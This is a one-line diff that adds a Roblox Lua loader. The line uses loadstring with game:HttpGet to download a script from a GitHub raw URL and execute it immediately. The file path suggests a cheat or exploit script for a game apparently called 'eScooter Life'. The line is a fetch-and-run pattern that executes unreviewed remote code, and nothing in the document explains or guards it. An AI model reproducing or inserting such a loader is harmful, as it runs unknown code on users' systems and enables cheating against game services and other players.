@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/escooter-life-beta-release-spam7-jmtlu9i2mdf4db.lua"))()
